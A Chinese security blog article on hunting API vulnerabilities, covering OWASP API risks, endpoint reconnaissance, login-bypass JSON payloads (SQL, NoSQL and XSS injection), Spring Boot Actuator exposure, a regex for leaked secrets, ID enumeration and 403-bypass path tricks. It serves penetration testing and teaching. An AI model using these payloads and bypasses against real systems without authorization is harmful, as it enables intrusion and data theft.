#  浅谈API漏洞挖掘   
原创 Tao  山石网科安全技术研究院   2024-04-24 10:32  
  
## Intro  
  
	API Security 是指通过一系列的实践和措施来保护应用程序接口（API）免受未经授权的访问、数据泄露和网络威胁的影响。API安全涉及到设计和实施策略和解决方案，以识别、了解和应对API特有的漏洞和安全风险，包括保护个人可识别信息等敏感数据，并减轻潜在攻击者带来的风险。确保健壮的API安全对于维护数据交换的完整性和保密性非常重要，同时还能防范潜在的恶意活动，确保依赖API的现代应用程序的功能性和安全性不受损。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDcd9zfuTtoUbyO2aa4w3as0JRMBQNHuibllWbt4zBFFnBdAjuWOmVKJg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDPA8hjaTg4P8kVzkgSVBrzibKVXzYkiabc3yJBV374aoU2SCTquVX7LQA/640?wx_fmt=png&from=appmsg "")  
  
API Testing  
  
	根据Salt公司关于API Security的研究报告显示，随着企业上云，数字化转型的背景下，企业开发的API越来越多，导致暴露安全的问题也逐渐增多。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDD0adlYia1iaQvY59L5vHm7YAMyFZuATzroXtpOibACicn5prN8kX54MWjA/640?wx_fmt=png&from=appmsg "")  
  
API attacks are on the rise  
  
	而本文旨在从攻击者的视角介绍如何进行API接口的漏洞挖掘。随着现代Web应用开发中采用一组服务形式向外界提供调用接口来满足不同类型不同服务消费者的需求，如传统Web页面服务、APP、小程序等，这些程序数量逐渐增多，相应的安全问题也在不断增加。在这种背景下，探讨如何审视API接口的潜在漏洞，并揭示如何从攻击者的视角理解和利用这些漏洞，将有助于提高应用程序的安全性和抵御潜在的攻击威胁。  
## OWASP Top 10 API Security Risks – 2023  
  
OWASP为强调API安全的重要性，在2019年首次提出了API Security Top 10。后随着安全产业实践加深，于2023年发布了API Security Top 10（候选版）的内容更新。该更新内容进一步强调了API攻击场景与Web攻击的差异化，突出API权限管理、资产管理、业务风控及供应链问题。  
  
主要变化如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDkp5ubKu6ODKiaiaBXnykicyibd8hmcQWvMV8p4gb9xuYxeBANCSoV576Gg/640?wx_fmt=png&from=appmsg "")  
  
从上面图片中就可以发现API攻击面，这给我们指明了一个清晰的方向。  
## API Security Testing  
  
在测试前，你应该要对整个业务可能产生漏洞的功能点有敏感的嗅觉，这其中需要你对测试站点或者程序做基本的收集，包括但不局限于：  
- 是否有API接口文档泄露，例如swagger等  
  
- curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'  
  
- # Extract Endpoints from swagger.json  
  
- API的请求路径，可通过OSINT进行收集或者手动触发之后枚举  
  
- Google Dork - API Docs: inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"example[.]com"  
  
- 从JS中寻找API Endpoints  
  
- https://github.com/momosecurity/FindSomething  
  
- 浏览器插件的被动式信息提取工具  
  
- HTML源代码的注释中查找到敏感的路径  
  
常见的漏洞如下：  
- API Exposure  
  
- Misconfigured Caching  
  
- Exposed tokens  
  
- JWT Weaknesses  
  
- Authorization Issues / IDOR / BOLA  
  
- Undocumented Endpoints  
  
- Different Versions  
  
- Rate Limiting (BF allowed)  
  
- Race Conditions  
  
- XXE injection  
  
- Switching Content Type  
  
- HTTP Methods  
  
- Injection Vulnerabilities  
  
有了上面的简单了解，接下来开始拆解具体的测试方法和部分案例吧。enjoy!!!  
### 0x1. API认证与授权  
- 确认好授权的凭证是那个值，cookies还是tokens？具体的key&value。tokens是指定的请求头字段还是？这个值从哪被赋值的？  
  
- Tokens的有效时间  
  
- Tokens是否可以从其他IP(或多设备)重复使用  
  
- Tokens是什么样形式的，是否包含敏感信息，如果是JWT，测试JWT相关漏洞  
  
- https://jwt.io/  
  
- https://github.com/KathanP19/HowToHunt/blob/master/JWT/JWT.md  
  
- Tokens的存储，以及退出后是否自动销毁  
  
- 如果是自定义的请求头，Tokens的加密，是否是前端可解密的，以及加密的密钥泄露，或者后端是否有返回密钥等，导致我们可以伪造任意用户的tokens  
  
### 0x2. API 请求头  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDyb229ZkJpHtDpN6mxibCNnNAC4Gbrd0LNequcZ1c2IjGTorDvNP5QcQ/640?wx_fmt=png&from=appmsg "")  
```
# EndPoints

api/v3/login  → 
api/v1/login
api/v2/login
......


/api/mobile/login → 
/api/v3/login
/api/pc/login
/api/h5/login
......

/api/users/[id|uuid]  →  
/api/users/1
/api/users/100
/api/users/*
/api/users/%
/api/users/_
/api/users/.
......


# Request Method

GET /api/admin/list → 
POST /api/admin/list
DELETE /api/admin/list
PUT /api/admin/list
.....



```  
### 0x3. API请求登录授权  
```
# 0x1. empty
{"username": "", "password": ""}

# 0x2. Null values
{"username": null, "password": null}

# 0x3. booleans values
{"username": null, "password": null}

# 0x4. arrarys
{"username": ["admin"], "password": ["admin"]}

# 0x5. objects
{"username": {"username": "admin"}, "password": {"password": "admin"}}

## 0x6. SQLi
{"username": "admin' -- ", "password": ""}
{"username": "admin\" -- ", "password": ""}
...

## 0x7. XSS
{"username": "admin\"><img>", "password": ""}

## 0x8. Missing key
{"username": "admin"}

## 0x9. Tab Characters in Strings
{"username": "admin\t", "password": ""}

## 0x10. escape characters
{"username": "ad\\nmin", "password": ""}

## 0x11. environment variables
{"username": "${username}", "password": "${password}"}

## 0x12. Empty key
{"": "admin", "password": "password"}

## 0x13. multiple values
{"username": ["admin","adm","administrator"], "password": "password"}

## 0x14. multiple escape sequences

{"username": "admin\\r\\n\\t", "password": ""}

## 0x15. NoSQL Injection
{"username": {"$ne": null}, "password": {"$ne": null}}

# 其他字段同理，比如id

{"id":10} -> {"id":[10]} -> {"id":[10,11,13]} -> {"id":{"id":10}} ......


```  
### 0x4. API请求响应包的修改  
```
# response header
401 Unauthorised -> 302 Redirect

# response body
false -> true
0 -> 1
......

```  
## Examples  
  
下面分享几个有意思的案例~  
### Springboot Actuator 未授权访问  
  
1.x版本  
```
/configprops # 显示所有@ConfigurationProperties
/env # 公开 Spring 的ConfigurableEnvironment
/health # 显示应用程序运行状况信息
/httptrace # 显示 HTTP 跟踪信息
/metrics # 显示当前应用程序的监控指标信息。
/mappings # 显示所有@RequestMapping路径的整理列表
/threaddump # 线程转储
/heapdump # 堆转储
/jolokia # JMX-HTTP桥,它提供了一种访问JMX beans的替代方法

```  
  
2.x版本  
```
/actuator/configprops # 显示所有@ConfigurationProperties
/actuator/env # 公开 Spring 的ConfigurableEnvironment
/actuator/health # 显示应用程序运行状况信息
/actuator/httptrace # 显示 HTTP 跟踪信息
/actuator/metrics # 显示当前应用程序的监控指标信息。
/actuator/mappings # 显示所有@RequestMapping路径的整理列表
/actuator/threaddump # 线程转储
/actuator/heapdump # 堆转储
/actuator/jolokia # JMX-HTTP桥,它提供了一种访问JMX beans的替代方法

```  
  
  
/actuator/heapdump => dbs(redis_password/mysql etc.) -> getshell  
  
Md: https://github.com/LandGrey/SpringBootVulExploit  
  
### API请求响应中泄露token信息  
  
正常的情况下，当我们进行登录授权的时候，服务器会返回给我们对应的授权凭证，但有时候服务端有别的接口（非正常授权）的响应也会返回token信息，从而泄露，导致安全问题，这里并不强调是未授权返回泄露的还是授权后别的接口泄露了，笔者认为，非正常授权返回token都有风险。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDzHhH65gDic2sRX8jkrLeKRIEk5x2H83j1iay6rCnqf13gKQOl1joXzlg/640?wx_fmt=png&from=appmsg "")  
  
在平时的挖掘中，我们可以用下面的正则去匹配。结合burp的HaE插件使用，也算个tips了  
```
(?i)(access_key|accessKeyId|accessKeySecret|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)['" ]+(=|:)# https://gist.github.com/h4x0r-dz/be69c7533075ab0d3f0c9b97f7c93a59# more keys: https://github.com/streaak/keyhacks
```  
### API请求参数枚举  
```
 https://xxx.com/networks/v2/api/segment/[Segment_id]  # id可枚举

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIID8uU1AxjED32DJictu3JuPEhSgGl5npz8T0QxNIKFjicrkkmZH4jVt7DA/640?wx_fmt=png&from=appmsg "")  
  
PIN参数Fuzzing后，得到有效的PIN码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDiazPQfsSMuUZ6jO5AD36tKqicFuOeV1m4j4ibm5u5Wto6obnF4bCR6mdQ/640?wx_fmt=png&from=appmsg "")  
  
增加个id=-1  
，返回了全部数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDWL9licPF7bC8rWbuuByRyxgrk2JdEC8K0C6EuTZsZPhd8hMyAb5eVxg/640?wx_fmt=png&from=appmsg "")  
  
跟常规的web安全测试大同小异。  
### Tips && Bypass  
- {"id": 1 } -> {"id": [1] }   
✅  
  
- {"id": 1 } -> {"id": {"id": 1 } }   
✅  
  
- {"user_id": "*"}  
  
- {"user_id": "-1"}  
  
- {"user_id": 2-1}  
  
- {"user_id": "1' -- "}  
  
- {"user_id": "1\" -- "}  
  
- /api/profile?id=&id=  
  
- POST请求同理  
  
- /actuator/env -> 给拦截或者无响应  
  
- //actuator////env  
  
- //actuator\\env  
  
- /Tao//test/../../actuator/env  
  
- 在路劲后加?,/,??,#,%20......  
  
- /api/v2/user/123 —> 403  
  
- /api/v2/user/123%23 —> 200  
  
- /?user_id=1 -> /?user_id=user@test.com √  
  
- POST -> PUT  
  
- 关键词替换：/download_file -> /export_file  
  
- 从结果中找keyword进行替换查询！  
  
- GET /api_v1/messages --> 401  
  
- GET /api_v1/messages?user_id=victim_uuid --> 200  
  
- Bypassing Endpoints by 'Aaryan' : Bypass 403 on /api/v1/user/id  
  
- /api/v1/user/id.json  
  
- /api/v1/user/id?  
  
- /api/v1/user/id/  
  
- /api/v2/user/id  
  
- /api/v1/user/id&accountdetail  
  
- /api/v1/user/yourid&victimid  
  
- X-Original-URL: /api/v1/user/id/  
  
## Tools  
- https://github.com/rtcatc/Packer-Fuzzer  
  
- https://github.com/API-Security/APIKit ✨  
  
- https://github.com/Fuzzapi/fuzzapi  
  
- https://github.com/flipkart-incubator/Astra  
  
- https://github.com/dwisiswant0/apkleaks ✨  
  
- https://api-guesser.netlify.app/ ✨  
  
- Wordlists  
  
- https://wordlists.assetnote.io/ ✨  
  
- https://github.com/Net-hunter121/API-Wordlist  
  
- https://github.com/Luci4n555/ApiFuzzDictionary ✨  
  
- https://github.com/chrislockard/api_wordlist  
  
## Conclusion  
  
总的来说，API接口的漏洞挖掘重点在于你对业务功能测试点的熟悉度和思路，在此基础上，扩展新的思路，逐渐形成自己的Checklist和Methodology。最后用几张API Security Mindmap收尾。  
同时也希望做开发的同学铭记：  
任何前端用户的输入都不可信！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIID0wwH9xCN2xEoo4YQwfDba31G7YF97vSaDRmyaPyGRQUsafwIGRB4lA/640?wx_fmt=png&from=appmsg "")  
  
API Pentesting Mindmap  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDRnUIPe5Sox7Gr2x9kncMxicyGWEcibw457EYoklgiccib85Bj3a1VEcDOQ/640?wx_fmt=png&from=appmsg "")  
  
API Pentesting Mindmap ATTACK  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTgX6hl4Aib8pczF5cgpzIIDGrXpuMvHB0LmOaGVXwFQ1cSeXekD1CwI4oW9eTjSmtxN8BqJqGu8Pg/640?wx_fmt=png&from=appmsg "")  
  
GraphQL Attacking Mindmap  
## References  
- https://github.com/arainho/awesome-api-security  
  
- https://content.salt.security/rs/352-UXR-417/images/SaltSecurity-Report-State_of_API_Security.pdf  
  
- https://dsopas.github.io/MindAPI/play/  
  
- https://github.com/Cyber-Guy1/API-SecurityEmpire  
  
- https://speakerdeck.com/riyazwalikar/api-security-testing-null-bangalore-january-2020  
  
- https://infosecwriteups.com/31-tips-api-security-pentesting-480b5998b765  
  
- https://www.studocu.com/id/document/universitas-indraprasta-pgri/pendidikan-bahasa-inggris/json-test-auth/77466774  
  
- https://bendtheory.medium.com/finding-and-exploiting-unintended-functionality-in-main-web-app-apis-6eca3ef000af  
  
- https://github.com/shieldfy/API-Security-Checklist  
  
- https://drive.google.com/file/d/1iMGqUUpaiQrEys4IOETwgxti8AiShomZ/view  
  
- https://mp.weixin.qq.com/s/yeHPG5lf9pVwdJA3dzm9qg  
  
- https://mp.weixin.qq.com/s/UrD8G3Eu3NDAtBq5up9WkQ  
  
- https://hackerone.com/reports/165727  
  
- https://hackerone.com/reports/56002  
  
- https://hackerone.com/reports/9843  
  
- https://www.guru99.com/api-testing.html  
  
- https://infosecwriteups.com/exploiting-apis-with-postman-and-google-chrome-ade13ce74e2b  
  
- https://rashahacks.com/how-i-fuzz-and-hack-api/  
  
- https://github.com/knownsec/KCon/blob/master/2022/%E8%87%AA%E5%8A%A8%E5%8C%96API%E6%BC%8F%E6%B4%9EFuzz%E5%AE%9E%E6%88%98%E3%80%90KCon2022%E3%80%91.pdf  
  
  
  
